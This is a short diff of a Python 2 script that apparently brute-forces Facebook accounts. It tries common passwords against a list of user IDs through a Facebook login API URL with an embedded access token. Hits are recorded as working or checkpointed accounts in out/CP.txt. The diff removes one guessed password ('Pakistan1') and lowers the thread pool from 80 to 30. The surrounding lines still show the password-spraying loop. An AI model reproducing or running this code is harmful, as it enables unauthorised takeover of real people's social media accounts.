@@ -303,7 +303,7 @@ def pilih_super():
 	 
 
 	def main(arg):
-		global cekpoint,oks
+		global oks
 		user = arg
 		try:
 			os.mkdir('out')
@@ -353,25 +353,12 @@ def pilih_super():
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
 									cekpoint.append(user+pass3)
-								else:
-									pass4 = 'Pakistan1'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q = json.load(data)
-									if 'access_token' in q:
-										print '\x1b[1;92m[OK] \x1b[1;92mID \x1b[1;92m✯ \x1b[1;92m' + user + ' \x1b[1;92mPass \x1b[1;92m✯ \x1b[1;92m' + pass4 + '\n'
-										oks.append(user+pass4)
-									else:
-										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;97m[CP] \x1b[1;97mID \x1b[1;97m✯ \x1b[1;97m' + user + ' \x1b[1;97mPass \x1b[1;97m✯ \x1b[1;97m' + pass4 + '\n'
-											cek = open("out/CP.txt", "a")
-											cek.write(user+"|"+pass4+"\n")
-											cek.close()
-											cekpoint.append(user+pass4)
+								
  										
 		except:																		
 			pass
 		
-	p = ThreadPool(80)
+	p = ThreadPool(30)
 	p.map(main, id) 
 	
 	print '\033[1;31;40m[✓] Process Has Been Completed\033[1;96m....'
